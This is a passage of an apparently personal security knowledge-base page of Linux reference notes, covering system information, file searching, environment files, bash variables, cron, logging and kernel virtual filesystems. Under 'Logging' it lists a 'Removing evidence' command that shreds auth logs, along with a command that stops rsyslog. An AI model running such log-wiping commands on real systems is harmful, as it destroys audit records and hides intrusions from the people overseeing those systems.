



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-4.2.0">
    
    
      
        <title>Linux - Security Knowledge Base</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/application.750b69bd.css">
      
      
    
    
      <script src="../assets/javascripts/modernizr.74668098.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../_site/extra.css">
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#quick-reference" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href=".." title="Security Knowledge Base" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Security Knowledge Base
            </span>
            <span class="md-header-nav__topic">
              Linux
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href=".." title="Security Knowledge Base" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Security Knowledge Base
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href=".." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../apt/" title="APT" class="md-nav__link">
      APT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../books/" title="Books" class="md-nav__link">
      Books
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../bug-hunting/" title="Bug hunting" class="md-nav__link">
      Bug hunting
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../career/" title="Career" class="md-nav__link">
      Career
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../code-review/" title="Code review" class="md-nav__link">
      Code review
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../crypto/" title="Crypto" class="md-nav__link">
      Crypto
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../databases-sqlserver/" title="Databases - SqlServer" class="md-nav__link">
      Databases - SqlServer
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../databases/" title="Databases" class="md-nav__link">
      Databases
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../defense/" title="Defense" class="md-nav__link">
      Defense
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../dfir/" title="DFIR" class="md-nav__link">
      DFIR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../embedded-and-iot/" title="Embedded and iot" class="md-nav__link">
      Embedded and iot
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../exploits_and_shellcoding/" title="Exploits and shellcoding" class="md-nav__link">
      Exploits and shellcoding
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../iam-kerberos/" title="IAM - Kerberos" class="md-nav__link">
      IAM - Kerberos
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../iam/" title="IAM" class="md-nav__link">
      IAM
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../languages/" title="Languages" class="md-nav__link">
      Languages
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../linux-issues/" title="Linux issues" class="md-nav__link">
      Linux issues
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Linux
      </label>
    
    <a href="./" title="Linux" class="md-nav__link md-nav__link--active">
      Linux
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#quick-reference" title="Quick Reference" class="md-nav__link">
    Quick Reference
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#general-information" title="General Information" class="md-nav__link">
    General Information
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging" title="Logging" class="md-nav__link">
    Logging
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kernel" title="Kernel" class="md-nav__link">
    Kernel
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#startup-process" title="Startup Process" class="md-nav__link">
    Startup Process
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#daemons" title="Daemons" class="md-nav__link">
    Daemons
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#managing-disks" title="Managing Disks" class="md-nav__link">
    Managing Disks
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#permissions" title="Permissions" class="md-nav__link">
    Permissions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#processes" title="Processes" class="md-nav__link">
    Processes
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#services" title="Services" class="md-nav__link">
    Services
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#networking" title="Networking" class="md-nav__link">
    Networking
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tools" title="Tools" class="md-nav__link">
    Tools
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#general-exploits" title="General Exploits" class="md-nav__link">
    General Exploits
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#important-files" title="Important Files" class="md-nav__link">
    Important Files
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#special-file-handling" title="Special File Handling" class="md-nav__link">
    Special File Handling
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#defense" title="Defense" class="md-nav__link">
    Defense
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#apparmor" title="AppArmor" class="md-nav__link">
    AppArmor
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#selinux" title="SELinux" class="md-nav__link">
    SELinux
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#seccomp" title="Seccomp" class="md-nav__link">
    Seccomp
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#capabilties" title="Capabilties" class="md-nav__link">
    Capabilties
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#grsecurity" title="Grsecurity" class="md-nav__link">
    Grsecurity
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pax" title="PAX" class="md-nav__link">
    PAX
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../malware/" title="Malware" class="md-nav__link">
      Malware
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../non-security/" title="Z Non Security" class="md-nav__link">
      Z Non Security
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../operating-systems/" title="Operating systems" class="md-nav__link">
      Operating systems
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../osint/" title="OSINT" class="md-nav__link">
      OSINT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../password-attacks/" title="Password attacks" class="md-nav__link">
      Password attacks
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../ports-and-protocols/" title="Ports and protocols" class="md-nav__link">
      Ports and protocols
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../practice/" title="Practice Environments" class="md-nav__link">
      Practice Environments
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../red-blue-team/" title="Red blue team" class="md-nav__link">
      Red blue team
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../reverse-engineering/" title="Reverse engineering" class="md-nav__link">
      Reverse engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../rf-and-sdr/" title="RF and SDR" class="md-nav__link">
      RF and SDR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../social-engineering/" title="Social engineering" class="md-nav__link">
      Social engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../steganography/" title="Steganography" class="md-nav__link">
      Steganography
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../vulnerable/" title="Vulnerable" class="md-nav__link">
      Vulnerable
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../wifi/" title="WiFi & Wireless" class="md-nav__link">
      WiFi & Wireless
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36" type="checkbox" id="nav-36">
    
    <label class="md-nav__link" for="nav-36">
      Certifications
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-36">
        Certifications
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/cissp/" title="CISSP" class="md-nav__link">
      CISSP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/osce/" title="OSCE" class="md-nav__link">
      OSCE
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oswe/" title="Oswe" class="md-nav__link">
      Oswe
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36-4" type="checkbox" id="nav-36-4">
    
    <label class="md-nav__link" for="nav-36-4">
      Oscp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-36-4">
        Oscp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/0-cheatsheet/" title="Enumeration" class="md-nav__link">
      Enumeration
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/_collections/" title="collections" class="md-nav__link">
       collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/_preparation/" title="Was checking" class="md-nav__link">
      Was checking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/lab-setup/" title="Lab Setup" class="md-nav__link">
      Lab Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/notes/" title="Notes" class="md-nav__link">
      Notes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/practice-vulnhub/" title="Practice" class="md-nav__link">
      Practice
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/setup/" title="Setup" class="md-nav__link">
      Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36-4-9" type="checkbox" id="nav-36-4-9">
    
    <label class="md-nav__link" for="nav-36-4-9">
      Cheatsheet
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-36-4-9">
        Cheatsheet
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/download/" title="Download" class="md-nav__link">
      Download
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/exploits/" title="Exploits" class="md-nav__link">
      Exploits
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/share-files/" title="Share files" class="md-nav__link">
      Share files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/shell/" title="Bash" class="md-nav__link">
      Bash
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/tty/" title="TTY" class="md-nav__link">
      TTY
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36-4-9-10" type="checkbox" id="nav-36-4-9-10">
    
    <label class="md-nav__link" for="nav-36-4-9-10">
      Enumeration
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-36-4-9-10">
        Enumeration
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/vulnerability/" title="Vulnerability" class="md-nav__link">
      Vulnerability
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/windows-local/" title="Windows local" class="md-nav__link">
      Windows local
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-37" type="checkbox" id="nav-37">
    
    <label class="md-nav__link" for="nav-37">
      Cloud
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-37">
        Cloud
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/aws/" title="Aws" class="md-nav__link">
      Aws
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/azuer-o360/" title="Azuer o360" class="md-nav__link">
      Azuer o360
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/general/" title="General" class="md-nav__link">
      General
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-38" type="checkbox" id="nav-38">
    
    <label class="md-nav__link" for="nav-38">
      Devops
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-38">
        Devops
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/CKAD/" title="CKAD" class="md-nav__link">
      CKAD
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/container/" title="Container" class="md-nav__link">
      Container
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/docker/" title="Docker" class="md-nav__link">
      Docker
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/istio/" title="Istio" class="md-nav__link">
      Istio
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/kubernetes/" title="Kubernetes" class="md-nav__link">
      Kubernetes
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-39" type="checkbox" id="nav-39">
    
    <label class="md-nav__link" for="nav-39">
      Windows
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-39">
        Windows
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/active-directory/" title="Active Directory" class="md-nav__link">
      Active Directory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/powershell/" title="Powershell" class="md-nav__link">
      Powershell
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/windows-issues/" title="Windows issues" class="md-nav__link">
      Windows issues
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/windows-privilege-escalation/" title="Windows Privilege Escalation" class="md-nav__link">
      Windows Privilege Escalation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#quick-reference" title="Quick Reference" class="md-nav__link">
    Quick Reference
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#general-information" title="General Information" class="md-nav__link">
    General Information
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging" title="Logging" class="md-nav__link">
    Logging
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kernel" title="Kernel" class="md-nav__link">
    Kernel
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#startup-process" title="Startup Process" class="md-nav__link">
    Startup Process
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#daemons" title="Daemons" class="md-nav__link">
    Daemons
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#managing-disks" title="Managing Disks" class="md-nav__link">
    Managing Disks
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#permissions" title="Permissions" class="md-nav__link">
    Permissions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#processes" title="Processes" class="md-nav__link">
    Processes
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#services" title="Services" class="md-nav__link">
    Services
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#networking" title="Networking" class="md-nav__link">
    Networking
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tools" title="Tools" class="md-nav__link">
    Tools
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#general-exploits" title="General Exploits" class="md-nav__link">
    General Exploits
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#important-files" title="Important Files" class="md-nav__link">
    Important Files
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#special-file-handling" title="Special File Handling" class="md-nav__link">
    Special File Handling
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#defense" title="Defense" class="md-nav__link">
    Defense
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#apparmor" title="AppArmor" class="md-nav__link">
    AppArmor
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#selinux" title="SELinux" class="md-nav__link">
    SELinux
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#seccomp" title="Seccomp" class="md-nav__link">
    Seccomp
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#capabilties" title="Capabilties" class="md-nav__link">
    Capabilties
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#grsecurity" title="Grsecurity" class="md-nav__link">
    Grsecurity
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pax" title="PAX" class="md-nav__link">
    PAX
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                  <h1>Linux</h1>
                
                <h2 id="quick-reference">Quick Reference<a class="headerlink" href="#quick-reference" title="Permanent link">&para;</a></h2>
<ul>
<li>Bash cheatsheet: <a href="https://devhints.io/bash.html">https://devhints.io/bash.html</a></li>
<li>Archiving/compressing: <a href="https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-archiving-compressing-files-0166153/">https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-archiving-compressing-files-0166153/</a></li>
</ul>
<h3 id="general-information">General Information<a class="headerlink" href="#general-information" title="Permanent link">&para;</a></h3>
<ul>
<li>System Information
    <div class="highlight"><pre><span></span><code>cat /proc/net/dev
lspci
ip link show
ip addr show

lscpu
cat /proc/cpuinfo
</code></pre></div></li>
<li>File information: <code>file &lt;filename&gt;</code></li>
<li>Shared library dependencies: <code>ldd &lt;filename&gt;</code></li>
<li>Searching:<ul>
<li>With database: <code>updatedb ; locate sbd.exe</code></li>
<li>Within PATH: <code>which sbd</code> <code>whereis sdb</code></li>
<li>Complex:
  <div class="highlight"><pre><span></span><code>find  /  -­‐name  sbd*
find / --name sdb* --exec file <span class="o">{}</span> <span class="se">\;</span>
</code></pre></div></li>
<li>Search for hidden (dot) files<code>find / -type d -name ".*"</code></li>
</ul>
</li>
<li>Mounting Devices:
    <div class="highlight"><pre><span></span><code>mount -t &lt;filesystemtype&gt; &lt;location&gt;
mount -t /dev/cdrom /media
umount /dev/cdrom
</code></pre></div></li>
<li>Distribution
    <div class="highlight"><pre><span></span><code>cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release  ### Debian based
cat /etc/redhat-release   ### Redhat based
</code></pre></div></li>
<li>Environment
    <div class="highlight"><pre><span></span><code>cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
</code></pre></div></li>
<li>Printers: <code>lpstat -a</code></li>
<li>Sys calls: <code>/usr/include /i386-linux-gnu/asm/unistd_32.h</code></li>
<li>New line in command line
    <div class="highlight"><pre><span></span><code>$ echo &quot;abc[CTRL+M]
def&quot;
</code></pre></div></li>
<li>Change password (one liner): <code>echo root:password | /usr/sbin/chpasswd</code></li>
<li>Bash Variables:<ul>
<li><code>$0</code> - The name of the Bash script</li>
<li><code>$1</code> - $9 - The first 9 arguments to the Bash script</li>
<li><code>$#</code> - Number of arguments passed to the Bash script</li>
<li><code>$@</code> - All arguments passed to the Bash script</li>
<li><code>$?</code> - The exit status of the most recently run process</li>
<li><code>$$</code> - The process ID of the current script</li>
<li><code>$USER</code> - The username of the user running the script</li>
<li><code>$HOSTNAME</code> - The hostname of the machine</li>
<li><code>$RANDOM</code> - A random number</li>
<li><code>$LINENO</code> - The current line number in the script</li>
</ul>
</li>
</ul>
<p><img alt="" src="../_assets/2020-08-09-16-57-53.png" /></p>
<ul>
<li>Cron:<ul>
<li>Shortcuts:<ul>
<li>@yearly</li>
<li>@annually</li>
<li>@monthly</li>
<li>@weekly</li>
<li>@daily</li>
<li>@midnight</li>
<li>@noon</li>
<li>@reboot</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img alt="" src="../_assets/2020-08-09-19-02-45.png" /></p>
<h3 id="logging">Logging<a class="headerlink" href="#logging" title="Permanent link">&para;</a></h3>
<ul>
<li><code>locate rsyslog</code></li>
<li>Config: <code>/etc/rsyslog.conf</code></li>
<li>Rotation: <code>/etc/logrotate.conf</code></li>
<li>Removing evidence: <code>shred -f -n 10 /var/log/auth.log.*</code></li>
<li>Disable: <code>service rsyslog stop</code></li>
</ul>
<h3 id="kernel">Kernel<a class="headerlink" href="#kernel" title="Permanent link">&para;</a></h3>
<ul>
<li>eBPF is a revolutionary technology that can run sandboxed programs in the Linux kernel without changing kernel source code or loading kernel modules. By making the Linux kernel programmable, infrastructure software can leverage existing layers, making them more intelligent and feature-rich without continuing to add additional layers of complexity to the system.: <a href="https://ebpf.io/">https://ebpf.io/</a></li>
<li>To communicate with the kernel, different UNIX systems use different interfaces<ul>
<li><a href="https://opensource.com/article/19/3/virtual-filesystems-linux">https://opensource.com/article/19/3/virtual-filesystems-linux</a></li>
<li>Source of VFS: <a href="https://www.tldp.org/LDP/khg/HyperNews/get/fs/vfstour.html">https://www.tldp.org/LDP/khg/HyperNews/get/fs/vfstour.html</a><ul>
<li>filesystem, must implement the open(), read(), and write() methods</li>
<li>kernel treats the generic filesystem as an abstract interface, and these big-three functions are "virtual," with no default definition</li>
<li>filesystems like ext4, NFS, and /proc all provide definitions of the big-three functions in a C-language data structure called <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/fs.h">file_operations</a></li>
<li>filesystems extend and override the VFS functions in the familiar object-oriented way</li>
<li>The function definitions that belong to the VFS base type itself are found in the fs/*.c files in kernel source, while the subdirectories of fs/ contain the specific filesystems. <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs</a></li>
<li><img alt="" src="../_assets/2020-08-02-09-13-56.png" /></li>
<li>Listing VFSs: <code>mount | grep -v sd | grep -v :/</code></li>
</ul>
</li>
<li>tempfs (/tmp)<ul>
<li><a href="https://wiki.archlinux.org/index.php/Tmpfs">https://wiki.archlinux.org/index.php/Tmpfs</a></li>
<li>By default, a tmpfs partition has its maximum size set to half of the available RAM</li>
<li>Under systemd, /tmp is automatically mounted as a tmpfs even though no entry is specified in /etc/fstab. </li>
<li><code>tmp.mount</code> systemd unit. </li>
</ul>
</li>
<li>procfs (/proc)<ul>
<li><a href="https://man7.org/linux/man-pages/man5/procfs.5.html">https://man7.org/linux/man-pages/man5/procfs.5.html</a></li>
<li>a snapshot into the instantaneous state of the kernel and the processes that it controls for userspace</li>
<li>special in-memory filesystem</li>
<li>used to present process information, kernel processes and other system information in a hierarchical file-like structure</li>
<li>This layer is expected to provide convenient access to the said information, acting as an interface to internal data structures in the kernel</li>
<li><code>/proc/sys</code> is where the settings that are configurable via the <code>sysctl</code> command are accessible to userspace</li>
